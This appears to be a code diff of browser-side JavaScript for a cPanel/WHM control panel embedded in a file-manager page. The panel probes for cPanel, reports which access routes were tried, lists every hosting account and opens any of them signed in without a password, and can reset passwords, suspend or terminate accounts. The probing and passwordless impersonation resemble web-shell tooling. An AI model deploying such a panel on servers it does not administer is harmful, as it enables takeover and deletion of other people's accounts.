+    $('cpmRailNote').innerHTML='cPanel is here, but nothing may speak for it yet. Open <b>Access</b> to see what was tried.';
+  }else{
+    $('cpmRailNote').textContent='Every account of this server is listed above. One press opens it signed in — nothing is typed, because the server signs its own session.';
+  }
+  await readAccounts(deep);
+  readPlans();
+}
+function drawAccess(d){
+  var cp=d.cpanel||{}, acc=d.access||{};
+  var marks=$('cpmMarks');
+  marks.innerHTML=(d.marks||[]).map(function(m){
+    return '<div class="cpm-mark '+(m.there?'yes':'no')+'"><span class="s">'+(m.there?'✓':'·')+'</span>'
+      +'<span class="p">'+esc(m.path)+'</span><span style="opacity:.7">'+esc(m.what)+'</span></div>';
+  }).join('');
+  var pr=d.probe;
+  say('cpmProbeMsg',pr&&pr.cpsrvd
+      ?('A cPanel web server answered at '+pr.url+' (HTTP '+pr.code+'), so this is a '+pr.kind+' server. '+(pr.from?('The address came from '+pr.from+'.'):''))
+      :'No cPanel web server answered on the addresses that were tried. The list is on the right.',pr&&pr.cpsrvd?'good':null);
+  var f=$('cpmAccessFacts');
+  var rows=[['Version',cp.version||'not readable'],['Host name',cp.host||'—'],
+            ['Accounts on disk',cp.users_dir?String(cp.total||0):'no /var/cpanel/users'],
+            ['cPanel ports',Object.keys(cp.ports||{}).join(', ')||'none open'],
+            ['Speaks through',acc.ok?acc.who:'nothing yet']];
+  f.innerHTML=rows.map(function(r){return '<div class="k">'+esc(r[0])+'</div><div class="v">'+esc(r[1])+'</div>';}).join('');
+  $('cpmAccessWhy').innerHTML=(acc.ok?[]:(acc.tried||[])).map(function(t){return '<div class="r">'+esc(t)+'</div>';}).join('');
+  $('cpmCandidates').innerHTML=(d.candidates||[]).map(function(c){
+    return '<div class="r">'+esc(c.host+':'+c.port)+' — '+esc(c.from)+'</div>';
+  }).join('');
+  var chips=[];
+  chips.push('<span class="cpm-pill '+(d.found?'ok':'warn')+'">'+(d.found?'cPanel found':'not found')+'</span>');
+  if(acc.ok)chips.push('<span class="cpm-pill ok">'+esc(acc.who)+'</span>');
+  else chips.push('<span class="cpm-pill warn">no way in yet</span>');
+  $('cpmAccessChips').innerHTML=chips.join('');
+  /* what the form shows: the saved address, or what was detected */
+  var s=d.store||{};
+  if(s.host&&!$('cpmHost').value)$('cpmHost').value=s.host;
+  if(s.port&&!$('cpmPort').value)$('cpmPort').value=s.port;
+  if(s.scheme)$('cpmScheme').value=s.scheme;
+  if(s.user&&!$('cpmUser').value)$('cpmUser').value=s.user;
+  if(s.auth)$('cpmAuth').value=s.auth;
+  if(s.has_secret)$('cpmSecret').placeholder='a sign-in is already saved — type a new one to replace it';
+}
+
+/* ── the account list ──────────────────────────────────────────────────── */
+async function readAccounts(deep){
+  var d=await call('accounts');
+  if(!d)return;
+  if(!d.ok){
+    $('cpmList').innerHTML='';
+    $('cpmEmpty').style.display='';
+    $('cpmEmpty').textContent=d.error||'The accounts could not be read.';
+    $('cpmCount').textContent='';
+    return;
+  }
+  $('cpmEmpty').style.display='none';
+  ACCOUNTS=d.accounts||[];
+  $('cpmCount').textContent='· '+ACCOUNTS.length;
+  $('cpmServer').textContent=($('cpmServer').textContent||'')+(d.via?('  ·  read through '+d.via):'');
+  if(d.note)say('cpmOpenMsg',d.note);
+  drawList();
+  if(SEL&&ACCOUNTS.some(function(a){return a.user===SEL;}))detail(SEL);
+  else if(ACCOUNTS.length){
+    var first=ACCOUNTS[0].user;
+    var q=($('cpmSearch').value||'').toLowerCase();
+    var vis=ACCOUNTS.filter(function(a){return !q||a.user.toLowerCase().indexOf(q)>=0||(a.domain||'').toLowerCase().indexOf(q)>=0;});
+    select((vis[0]||ACCOUNTS[0]).user,false);
+  }else{
+    $('cpmBody').hidden=true;$('cpmPlaceholder').hidden=false;
   }
 }
+function drawList(){
+  var q=($('cpmSearch').value||'').toLowerCase();
+  var vis=ACCOUNTS.filter(function(a){return !q||a.user.toLowerCase().indexOf(q)>=0||(a.domain||'').toLowerCase().indexOf(q)>=0;});
+  $('cpmList').innerHTML=vis.map(function(a){
+    var on=a.user===SEL?' is-on':'';
+    return '<button type="button" class="pma-item'+on+'" data-cpm-user="'+esc(a.user)+'">'
+      +'<span class="cpm-dot'+(a.suspended?' off':'')+'"></span>'
+      +'<span class="t"><b>'+esc(a.user)+'</b><span>'+esc(a.domain||'—')+(a.suspended?' · suspended':'')+'</span></span>'
+      +'</button>';
+  }).join('')||'<div class="pma-empty">Nothing matches that.</div>';
+}
+function select(user,gesture){
+  if(!user)return;
+  SEL=user;
+  drawList();
+  detail(user);
+}
+async function detail(user){
+  var d=await call('account',{user:user});
+  if(!d||!d.ok){say('cpmMsg',(d&&d.error)||'That account could not be read.','bad');return;}
+  render(d.account,d.extra||{});
+}
 
-function cpSwitchTab(tab){
-  document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
-    const active=b.dataset.tab===tab;
-    b.style.borderBottomColor=active?'#85898C':'transparent';
-    b.style.color=active?'#85898C':'var(--t3)';
-    b.classList.toggle('cpanel-tab-active',active);
+function render(a,x){
+  if(!a)return;
+  $('cpmPlaceholder').hidden=true;
+  $('cpmAccessBody').hidden=true;
+  $('cpmBody').hidden=false;
+  $('cpmTitle').textContent=a.user;
+  $('cpmSub').textContent=(a.domain||'no domain')+(a.email?('  ·  '+a.email):'');
+  var chips=[];
+  chips.push('<span class="cpm-pill '+(a.suspended?'warn':'ok')+'">'+(a.suspended?'suspended':'active')+'</span>');
+  if(a.plan)chips.push('<span class="cpm-pill acc">'+esc(a.plan)+'</span>');
+  if(a.disk_pct!==null&&a.disk_pct!==undefined)chips.push('<span class="cpm-pill'+(a.disk_pct>85?' warn':'')+'">'+a.disk_pct+'% of the disk</span>');
+  if(x.domains&&x.domains.length>1)chips.push('<span class="cpm-pill">'+x.domains.length+' domains</span>');
+  $('cpmChips').innerHTML=chips.join('');
+  $('cpmOpenWho').textContent='as '+a.user;
+
+  /* usage */
+  var u=[];
+  if(a.disklimit){
+    u.push('<div style="font-size:11.5px;color:var(--t2)">Disk <b style="color:var(--t1)">'+fmt(a.diskused)+'</b> of '+fmt(a.disklimit)+'</div>'
+      +'<div class="cpm-bar'+(a.disk_pct>85?' bad':(a.disk_pct>70?' warn':''))+'"><i style="width:'+(a.disk_pct||0)+'%"></i></div>');
+  }else{
+    u.push('<div style="font-size:11.5px;color:var(--t2)">Disk <b style="color:var(--t1)">'+fmt(a.diskused)+'</b> <span style="color:var(--t3)">· no limit on this package</span></div>');
+  }
+  u.push('<div class="cpm-kv" style="margin-top:9px">'
+    +kv('Bandwidth',(a.bwlimit?fmt(a.bwused)+' of '+fmt(a.bwlimit):fmt(a.bwused)+' (no limit)'))
+    +kv('Mailboxes',a.maxpop||'—')+kv('Databases',a.maxsql||'—')
+    +kv('Subdomains',a.maxsub||'—')+kv('Addon domains',a.maxaddons||'—')
+    +'</div>');
+  $('cpmUsage').innerHTML=u.join('');
+
+  /* facts */
+  $('cpmFacts').innerHTML=[
+    ['User',a.user],['Main domain',a.domain||'—'],['Address',a.ip||'—'],
+    ['Started',a.startdate||'—'],['Shell',a.shell||'—'],['Theme',a.theme||'—'],
+    ['State',a.suspended?('suspended'+(a.reason?(' — '+a.reason):'')):'active']
+  ].map(function(r){return kv(r[0],r[1],true);}).join('');
+
+  /* extras */
+  var ex=[];
+  if(x.domains&&x.domains.length)ex.push(kv('Domains',x.domains.join(', ')));
+  if(x.email_accounts&&x.email_accounts.length)ex.push(kv('Mailboxes',x.email_accounts.join(', ')));
+  if(x.dbs&&x.dbs.length)ex.push(kv('Databases',x.dbs.join(', ')));
+  if(x.partition)ex.push(kv('Home',x.partition+'/'+a.user));
+  $('cpmExtra').innerHTML=ex.join('');
+  $('cpmExtraSec').hidden=!ex.length;
+
+  /* state buttons */
+  $('cpmSuspendBtn').textContent=a.suspended?'Put it back':'Suspend';
+  $('cpmSuspendBtn').setAttribute('data-cpm-mode',moveOn(a.suspended?'unsuspend':'suspend'));
+  $('cpmTermBtn').setAttribute('data-cpm-user',a.user);
+  $('cpmPassInput').value='';
+  say('cpmStateMsg',a.suspended?'Suspended: every file is still there and the site is down. Putting it back needs one press.'
+      :'Suspending keeps every file and stops the site; terminating deletes the account and all of it.');
+  say('cpmPassMsg','Opening the account signed in never needs it; this is only for signing in somewhere else.');
+  say('cpmMsg','');
+  fillPlans(a.plan);
+  hideSso();
+}
+function moveOn(v){return v;}
+function kv(k,v,mono){return '<div class="k">'+esc(k)+'</div><div class="v'+(mono?' mono':'')+'">'+esc(v==null||v===''?'—':v)+'</div>';}
+/* cPanel counts disk in megabytes, so these numbers are megabytes */
+function fmt(n){
+  n=Number(n)||0;
+  if(n>=1024)return (n/1024).toFixed(1).replace(/\.0$/,'')+' GB';
+  return n+' MB';
+}
+
+/* ── packages ──────────────────────────────────────────────────────────── */
+async function readPlans(){
+  var d=await call('plans');
+  if(!d||!d.ok)return;
+  PLANS=d.plans||[];
+  var opts=PLANS.map(function(p){return '<option value="'+esc(p.name)+'">'+esc(p.name)+'</option>';}).join('');
+  $('cpmNewPlan').innerHTML=opts||'<option value="default">default</option>';
+  fillPlans(SEL?null:null);
+}
+function fillPlans(current){
+  var a=null;
+  for(var i=0;i<ACCOUNTS.length;i++)if(ACCOUNTS[i].user===SEL)a=ACCOUNTS[i];
+  if(current===null||current===undefined)current=a?a.plan:'';
+  var list=PLANS.slice();
+  if(current&&!list.some(function(p){return p.name===current;}))list.unshift({name:current});
+  $('cpmPlanSel').innerHTML=list.map(function(p){
+    return '<option value="'+esc(p.name)+'"'+(p.name===current?' selected':'')+'>'+esc(p.name)
+      +(p.quota?('  ·  disk '+esc(p.quota)+' MB'):'')+(p.bwlimit?('  ·  band '+esc(p.bwlimit)+' MB'):'')+'</option>';
+  }).join('')||'<option value="">no package</option>';
+}
+
+/* ── opening an account, signed in ─────────────────────────────────────── */
+function hideSso(){
+  $('cpmSso').classList.add('hide');
+  LAST_URL='';LEFT=null;stopClock();
+}
+function stopClock(){if(LEFT){clearInterval(LEFT);LEFT=null;}}
+async function loginAs(user,service,gesture){
+  if(!user)return;
+  var label=service==='whostmgrd'?'WHM':(service==='webmaild'?'the webmail of '+user:'cPanel');
+  TURN++;
+  var turn=TURN;
+  var w=gesture?slot(label):null;
+  say('cpmOpenMsg','Asking the server for a session for '+user+'…');
+  var d=await call('login',{user:user,service:service});
+  if(turn!==TURN){slotClose(w);return;}
+  if(!d||!d.ok){
+    slotClose(w);
+    say('cpmOpenMsg',(d&&d.error)||'The session could not be created.','bad');
+    return;
+  }
+  say('cpmOpenMsg',d.message||('The server signed a session for '+user+'.'),'good');
+  showSso(d,w);
+}
+function showSso(d,w){
+  LAST_URL=d.url;
+  $('cpmSso').classList.remove('hide');
+  $('cpmSsoHead').textContent='Session signed by the server'+(d.verified?' — checked, it lands signed in':'');
+  $('cpmSsoLink').textContent=d.url;
+  $('cpmSsoNote').textContent='cPanel signed this session itself, so no password was needed and none was sent. The address is good for a quarter of an hour, and it opens only that one account.';
+  var went=w?slotGo(w,d.url):false;
+  if(went)say('cpmOpenMsg','Opened in the tab that was taken for it.','good');
+  else if(!w)say('cpmOpenMsg','The browser did not give a tab — press Open it, the address is ready.','bad');
+  startClock(d.expires);
+}
+function startClock(expires){
+  stopClock();
+  var end=Number(expires)||0;
+  if(!end)return;
+  var tick=function(){
+    var left=Math.round(end-Date.now()/1000);
+    if(left<=0){$('cpmSsoLeft').textContent='the session has run out';stopClock();return;}
+    var m=Math.floor(left/60),s=left%60;
+    $('cpmSsoLeft').textContent='runs out in '+m+':'+(s<10?'0':'')+s;
+  };
+  tick();
+  LEFT=setInterval(tick,1000);
+}
+
+/* ── the actions ───────────────────────────────────────────────────────── */
+/* an action is reported after the page has been read again, so the answer is
+   not wiped by the redraw that follows it */
+async function act(action,extra,okText,msgId){
+  var id=msgId||'cpmMsg';
+  say(id,'Working…');
+  var d=await call(action,extra);
+  if(!d||!d.ok){say(id,(d&&d.error)||'That did not work.','bad');return false;}
+  await readAccounts(true);
+  if(SEL)await detail(SEL);
+  say(id,d.message||okText||'Done.','good');
+  return true;
+}
+function bind(){
+  $('cpmClose').onclick=close;
+  $('cpmRefresh').onclick=function(){SEL=SEL;load(true);};
+  $('cpmAccessBtn').onclick=function(){
+    ACCESS=!ACCESS;
+    $('cpmBody').hidden=ACCESS;
+    $('cpmPlaceholder').hidden=true;
+    $('cpmAccessBody').hidden=!ACCESS;
+    if(!ACCESS&&SEL)detail(SEL);
+  };
+  $('cpmSearch').oninput=drawList;
+  $('cpmList').onclick=function(e){
+    var b=e.target.closest('[data-cpm-user]');
+    if(b)select(b.getAttribute('data-cpm-user'),true);
+  };
+  Array.prototype.forEach.call(document.querySelectorAll('[data-cpm-service]'),function(b){
+    b.onclick=function(){
+      if(!SEL)return;
+      loginAs(SEL,b.getAttribute('data-cpm-service'),true);
+    };
   });
-  document.getElementById('cpanelAccountsBody').style.display=tab==='accounts'?'':'none';
-  document.getElementById('cpanelConnBody').style.display=tab==='connect'?'':'none';
-}
-document.getElementById('cpanelClose')?.addEventListener('click',()=>closeMod(cpOv));
-
-/* ── Connection panel ── */
-function renderCpConn(){
-  const el=cpConnBody();
-  el.innerHTML='<div style="text-align:center;padding:24px;color:var(--t3)">Detecting…</div>';
-  fetch('?x=cpanel_detect').then(r=>r.json()).then(d=>{
-    const portList=Object.entries(d.ports||{}).map(([p,l])=>`<span style="display:inline-flex;align-items:center;gap:4px;margin-right:8px;color:#4ade80;font-size:11.5px"><svg viewBox="0 0 24 24" style="width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2.5"><polyline points="20 6 9 17 4 12"/></svg>:${p} ${esc(l)}</span>`).join('');
-    const detInfo=`
-      <div style="padding:12px 16px;border-bottom:1px solid var(--b2);display:flex;flex-wrap:wrap;gap:8px;align-items:center">
-        <span style="font-size:11px;color:var(--t3)">cPanel installed: <strong style="color:${d.installed?'#4ade80':'#fb923c'}">${d.installed?'Yes':'Not detected'}</strong></span>
-        <span style="font-size:11px;color:var(--t3)">Current user: <strong style="color:var(--t2)">${d.current_user?esc(d.current_user):'unknown'}</strong></span>
-        <span style="font-size:11px;color:var(--t3)">Host: <strong style="color:var(--t2)">${esc(d.hostname||'-')}</strong></span>
-      </div>
-      ${portList?`<div style="padding:8px 16px;border-bottom:1px solid var(--b2);font-size:11px;color:var(--t3)">Open ports: ${portList}</div>`:'<div style="padding:8px 16px;border-bottom:1px solid var(--b2);font-size:11px;color:#fb923c">No cPanel ports reachable on localhost. The API calls below may still work if the server is remote.</div>'}`;
-    const savedBadge=d.has_creds?`<div style="padding:8px 16px;background:rgba(74,222,128,.07);border-bottom:1px solid var(--b2);font-size:11.5px;color:#4ade80">${fmSvgIcon('check',12)} Credentials saved — user: <strong>${esc(d.saved_user)}</strong> · API: <strong>${d.saved_api}</strong> · port: <strong>${d.saved_port||'-'}</strong></div>`:'';
-    el.innerHTML=`
-      ${detInfo}
-      ${savedBadge}
-      <div style="padding:16px">
-        <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);margin-bottom:10px">API Credentials</div>
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
-          <div>
-            <label class="lbl">API Type</label>
-            <select id="cpConnApiType" class="inp" style="width:100%">
-              <option value="whm">WHM (Root / Reseller)</option>
-              <option value="cpanel">cPanel (Account level)</option>
-            </select>
-          </div>
-          <div>
-            <label class="lbl">Auth Type</label>
-            <select id="cpConnAuthType" class="inp" style="width:100%">
-              <option value="password">Password</option>
-              <option value="token">API Token</option>
-            </select>
-          </div>
-        </div>
-        <label class="lbl">Username</label>
-        <input type="text" id="cpConnUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="${d.current_user?d.current_user:'root or your cPanel username'}" value="${d.has_creds?esc(d.saved_user):''}">
-        <label class="lbl">Password / API Token</label>
-        <input type="password" id="cpConnPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="${d.saved_api?'Leave blank to keep saved password':'Enter password or API token'}">
-        <label class="lbl">Port</label>
-        <select id="cpConnPort" class="inp" style="width:100%;margin-bottom:14px">
-          <option value="2087"${(!d.saved_port||d.saved_port===2087)?' selected':''}>2087 — WHM HTTPS (recommended)</option>
-          <option value="2086"${d.saved_port===2086?' selected':''}>2086 — WHM HTTP</option>
-          <option value="2083"${d.saved_port===2083?' selected':''}>2083 — cPanel HTTPS</option>
-          <option value="2082"${d.saved_port===2082?' selected':''}>2082 — cPanel HTTP</option>
-        </select>
-        <button type="button" id="cpConnSave" class="btn btn-p" style="width:100%">Save &amp; Connect</button>
-        <div id="cpConnFeedback" style="margin-top:8px;font-size:12px"></div>
-        <div style="margin-top:12px;padding:10px;background:rgba(133,137,140,.07);border-radius:8px;font-size:11px;color:var(--t3);line-height:1.6">
-          <strong style="color:var(--t2)">How to get an API token:</strong> Log in to WHM or cPanel → Development → Manage API Tokens → Create. Paste the token in the password field and choose "API Token" above. Credentials are stored only in your browser session and cleared on logout.
-        </div>
-      </div>`;
-    // restore saved api/auth type
-    if(d.saved_api)document.getElementById('cpConnApiType').value=d.saved_api;
-    document.getElementById('cpConnSave').addEventListener('click',async()=>{
-      const btn=document.getElementById('cpConnSave');
-      btn.disabled=true;btn.textContent='Saving…';
-      const fd=new FormData();
-      fd.append('csrf_token',CSRF);
-      fd.append('action','cpanel_save_creds');
-      fd.append('cp_user',document.getElementById('cpConnUser').value.trim());
-      fd.append('cp_pass',document.getElementById('cpConnPass').value);
-      fd.append('cp_auth_type',document.getElementById('cpConnAuthType').value);
-      fd.append('cp_api_type',document.getElementById('cpConnApiType').value);
-      fd.append('cp_port',document.getElementById('cpConnPort').value);
-      await fetch('',{method:'POST',body:fd});
-      btn.disabled=false;btn.textContent='Save & Connect';
-      toast('Credentials saved. Loading accounts…');
-      cpSwitchTab('accounts');
-      loadCpAccounts();
-    });
-  }).catch(e=>el.innerHTML=`<div style="padding:20px;color:#fca5a5">Detection failed: ${esc(String(e))}</div>`);
-}
-
-/* ── Accounts list ── */
-async function loadCpAccounts(){
-  const el=cpAccBody();
-  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)"><svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin-bottom:10px;display:block;margin-inline:auto"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg>Loading accounts…</div>';
-  try{
-    const d=await fetch('?x=cpanel_accounts').then(r=>r.json());
-    if(d.error==='no_creds'){
-      el.innerHTML=`
-        <div style="padding:40px;text-align:center">
-          <svg viewBox="0 0 24 24" style="width:40px;height:40px;stroke:var(--t3);fill:none;stroke-width:1.2;margin-bottom:12px;display:block;margin-inline:auto"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-          <div style="font-size:14px;font-weight:600;color:var(--t2);margin-bottom:6px">Connection required</div>
-          <div style="font-size:12px;color:var(--t3);margin-bottom:18px;line-height:1.6">Auto-detection found no cPanel credentials. Enter them in the <strong style="color:#85898C">Connection</strong> tab.</div>
-          <button class="btn btn-p" id="cpGoConnect">Open Connection Settings</button>
-        </div>`;
-      document.getElementById('cpGoConnect')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
+  $('cpmSsoOpen').onclick=function(){
+    if(!LAST_URL)return;
+    var w=slot('cPanel');
+    if(!slotGo(w,LAST_URL))window.open(LAST_URL,'_blank');
+  };
+  $('cpmSsoCopy').onclick=function(){
+    if(!LAST_URL)return;
+    var done=function(){say('cpmOpenMsg','The address is on the clipboard.','good');};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(LAST_URL).then(done,function(){});}
+    else{var t=document.createElement('textarea');t.value=LAST_URL;document.body.appendChild(t);t.select();try{document.execCommand('copy');done();}catch(e){}t.remove();}
+  };
+  $('cpmPlanApply').onclick=function(){
+    var pkg=$('cpmPlanSel').value;
+    if(!SEL||!pkg)return;
+    act('package',{user:SEL,package:pkg},'The package was changed.','cpmMsg');
+  };
+  $('cpmSuspendBtn').onclick=function(){
+    if(!SEL)return;
+    var mode=this.getAttribute('data-cpm-mode')==='unsuspend'?'unsuspend':'suspend';
+    act(mode,{user:SEL},mode==='suspend'?'The account was suspended.':'The account was put back.','cpmStateMsg');
+  };
+  $('cpmTermBtn').onclick=function(){
+    if(!SEL)return;
+    var user=SEL;
+    if(this.getAttribute('data-armed')==='1'){
+      act('terminate',{user:user,confirm:'1'},'The account was terminated.','cpmStateMsg');
+      this.removeAttribute('data-armed');this.textContent='Terminate';
       return;
     }
-    if(d.error){
-      el.innerHTML=`<div style="padding:24px"><div style="margin-bottom:12px;padding:10px;background:rgba(252,165,165,.1);border-radius:8px;color:#fca5a5;font-size:12.5px">${esc(d.error)}</div><button class="btn btn-s" id="cpGoConnErr">Open Connection Settings</button></div>`;
-      document.getElementById('cpGoConnErr')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
-      return;
+    this.setAttribute('data-armed','1');
+    this.textContent='Press again to delete '+user;
+    say('cpmStateMsg','Terminating deletes the account, its files, its mail and its databases. Nothing has been done yet — press the button once more to do it.','bad');
+  };
+  $('cpmPassApply').onclick=function(){
+    var p=$('cpmPassInput').value||'';
+    if(!SEL)return;
+    if(p.length<8){say('cpmPassMsg','A password needs at least eight characters. Nothing was changed.','bad');return;}
+    act('password',{user:SEL,password:p},'The password was replaced.','cpmPassMsg');
+  };
+  $('cpmPassMake').onclick=function(){
+    var abc='abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!#$%&*+-=?';
+    var out='';
+    if(window.crypto&&crypto.getRandomValues){
+      var buf=new Uint32Array(18);crypto.getRandomValues(buf);
+      for(var i=0;i<18;i++)out+=abc.charAt(buf[i]%abc.length);
+    }else{
+      for(var j=0;j<18;j++)out+=abc.charAt(Math.floor(Math.random()*abc.length));
     }
-    const accts=d.accounts||[];
-    const apiLabel=d.api==='whm'?'WHM':'cPanel';
-    const rows=accts.map(a=>{
-      const suspBadge=a.suspended?`<span style="display:inline-flex;align-items:center;gap:3px;color:#fb923c;font-size:10px;font-weight:700;margin-left:4px"><svg viewBox="0 0 24 24" style="width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2.5"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>Suspended</span>`:'';
-      const diskInfo=a.diskused?`${esc(a.diskused)} / ${esc(a.disklimit||'∞')}`:'—';
-      return `<tr>
-        <td style="padding:9px 12px;font-weight:600;white-space:nowrap">${esc(a.user)}${suspBadge}</td>
-        <td style="padding:9px 12px;font-size:12px;color:var(--t2)">${esc(a.domain||'—')}</td>
-        <td style="padding:9px 12px;font-size:11.5px;color:var(--t3)">${esc(a.email||'—')}</td>
-        <td style="padding:9px 12px"><span style="background:var(--raised);padding:2px 9px;border-radius:20px;font-size:10.5px">${esc(a.plan||'—')}</span></td>
-        <td style="padding:9px 12px;font-size:11.5px;font-family:monospace;color:var(--t3)">${diskInfo}</td>
-        <td style="padding:9px 12px;white-space:nowrap">
-          <button class="btn btn-xs btn-g cp-chpass-btn" data-user="${esc(a.user)}" style="margin-right:4px">Password</button>
-          ${d.api==='whm'?`<button class="btn btn-xs ${a.suspended?'btn-p':'btn-g'} cp-suspend-btn" data-user="${esc(a.user)}" data-suspended="${a.suspended?'1':'0'}" style="margin-right:4px">${a.suspended?'Unsuspend':'Suspend'}</button>
-          <button class="btn btn-xs btn-red cp-term-btn" data-user="${esc(a.user)}">Terminate</button>`:''}
-        </td></tr>`;
-    }).join('');
-    el.innerHTML=`
-      <div style="padding:10px 14px;border-bottom:1px solid var(--b2);display:flex;align-items:center;gap:10px">
-        <span style="font-size:12px;color:var(--t2);flex:1">${accts.length} account${accts.length!==1?'s':''} · ${apiLabel} API · port ${d.port}</span>
-        ${d.api==='whm'?`<button class="btn btn-p btn-xs" id="cpCreateAccBtn" style="font-size:11.5px"><svg viewBox="0 0 24 24" style="width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2.5;margin-right:4px;vertical-align:-1px"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>New Account</button>`:''}
-        <button class="btn btn-xs btn-g" id="cpRefreshBtn" style="font-size:11.5px">${fmSvgIcon('refresh',12)} Refresh</button>
-      </div>
-      <div style="overflow:auto;max-height:52vh">
-        ${accts.length?`<table class="log-t" style="width:100%">
-          <thead><tr>
-            <th style="padding:8px 12px;font-size:11px;text-align:left">Username</th>
-            <th style="padding:8px 12px;font-size:11px;text-align:left">Domain</th>
-            <th style="padding:8px 12px;font-size:11px;text-align:left">Email</th>
-            <th style="padding:8px 12px;font-size:11px;text-align:left">Plan</th>
-            <th style="padding:8px 12px;font-size:11px;text-align:left">Disk</th>
-            <th style="padding:8px 12px;font-size:11px;text-align:left">Actions</th>
-          </tr></thead>
-          <tbody>${rows}</tbody>
-        </table>`:`<div class="empty" style="padding:40px"><p>No accounts found.</p></div>`}
-      </div>`;
-    document.getElementById('cpRefreshBtn')?.addEventListener('click',loadCpAccounts);
-    document.getElementById('cpCreateAccBtn')?.addEventListener('click',openCpCreate);
-    // Change password buttons
-    el.querySelectorAll('.cp-chpass-btn').forEach(b=>b.addEventListener('click',()=>{
-      document.getElementById('cpPassTargetUser').value=b.dataset.user;
-      document.getElementById('cpanelPassTitle').textContent='Change Password: '+b.dataset.user;
-      document.getElementById('cpPassNew').value='';
-      document.getElementById('cpanelPassFeedback').innerHTML='';
-      openMod('cpanelPassOv');
-    }));
-    // Suspend/Unsuspend
-    el.querySelectorAll('.cp-suspend-btn').forEach(b=>b.addEventListener('click',async()=>{
-      const action=b.dataset.suspended==='1'?'unsuspend':'suspend';
-      const reason=action==='suspend'?prompt('Suspension reason (optional):','Suspended by admin'):'';
-      if(reason===null)return;// cancelled
-      b.disabled=true;b.textContent='Wait…';
-      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_suspend');
-      fd.append('cp_target_user',b.dataset.user);fd.append('cp_suspend_action',action);
-      if(reason)fd.append('cp_reason',reason);
-      await fetch('',{method:'POST',body:fd});
-      toast(action==='suspend'?`"${b.dataset.user}" suspended.`:`"${b.dataset.user}" unsuspended.`);
-      loadCpAccounts();
-    }));
-    // Terminate
-    el.querySelectorAll('.cp-term-btn').forEach(b=>b.addEventListener('click',async()=>{
-      if(!confirm(`PERMANENTLY TERMINATE account "${b.dataset.user}"?\n\nThis deletes all files, databases, and email accounts for this cPanel user. This action CANNOT be undone.`))return;
-      if(!confirm(`Are you absolutely sure you want to terminate "${b.dataset.user}"?`))return;
-      b.disabled=true;b.textContent='Terminating…';
-      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_terminate');
-      fd.append('cp_target_user',b.dataset.user);
-      await fetch('',{method:'POST',body:fd});
-      toast(`Account "${b.dataset.user}" terminated.`);
-      loadCpAccounts();
-    }));
-  }catch(e){el.innerHTML=`<div style="padding:20px;color:#fca5a5">Failed: ${esc(String(e))}</div>`;}
+    $('cpmPassInput').value=out;
+    say('cpmPassMsg','Made here, in this browser. Press Replace it to use it.','good');
+  };
+  $('cpmNewBtn').onclick=function(){
+    $('cpmCreateBlock').classList.toggle('on');
+    $('cpmBody').hidden=false;$('cpmAccessBody').hidden=true;$('cpmPlaceholder').hidden=true;
+    $('cpmNewUser').focus();
+  };
+  $('cpmNewCancel').onclick=function(){$('cpmCreateBlock').classList.remove('on');};
+  $('cpmNewCreate').onclick=async function(){
+    var u=$('cpmNewUser').value.trim(),dom=$('cpmNewDomain').value.trim(),p=$('cpmNewPass').value;
+    if(!u||!dom){say('cpmNewMsg','A user name and a domain are needed.','bad');return;}
+    if(p.length<8){say('cpmNewMsg','A password needs at least eight characters.','bad');return;}
+    var ok=await act('create',{username:u,domain:dom,password:p,package:$('cpmNewPlan').value,email:$('cpmNewEmail').value.trim()},'The account was created.','cpmNewMsg');
+    if(ok){$('cpmCreateBlock').classList.remove('on');$('cpmNewUser').value='';$('cpmNewDomain').value='';$('cpmNewPass').value='';$('cpmNewEmail').value='';}
+  };
+  $('cpmConnectSave').onclick=async function(){
+    var d=await call('connect',{host:$('cpmHost').value.trim(),port:$('cpmPort').value.trim()||'2087',
+      scheme:$('cpmScheme').value,user:$('cpmUser').value.trim()||'root',
+      auth:$('cpmAuth').value,secret:$('cpmSecret').value});
+    if(!d||!d.ok){say('cpmConnectMsg',(d&&d.error)||'That sign-in did not work.','bad');return;}
+    $('cpmSecret').value='';
+    say('cpmConnectMsg',d.message||'Connected.','good');
+    load(true);
+  };
+  $('cpmDisconnect').onclick=async function(){
+    var d=await call('disconnect');
+    if(!d||!d.ok)return;
+    say('cpmConnectMsg',d.message||'Forgotten.','good');
+    $('cpmSecret').value='';$('cpmHost').value='';$('cpmPort').value='';$('cpmUser').value='';
+    load(true);
+  };
+  var btn=document.getElementById('cpanelBtn');
+  if(btn)btn.onclick=open;
 }
+if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',bind);
+else bind();
+window.cpmOpen=open;
+})();
 
-/* ── Create Account modal ── */
-async function openCpCreate(){
-  document.getElementById('cpNewUser').value='';document.getElementById('cpNewDomain').value='';
-  document.getElementById('cpNewPass').value='';document.getElementById('cpNewEmail').value='';
-  document.getElementById('cpanelCreateFeedback').innerHTML='';
-  openMod('cpanelCreateOv');
-  // Load plans
-  const sel=document.getElementById('cpNewPlan');
-  sel.innerHTML='<option value="">Loading…</option>';
-  try{
-    const d=await fetch('?x=cpanel_plans').then(r=>r.json());
-    if(d.plans&&d.plans.length){
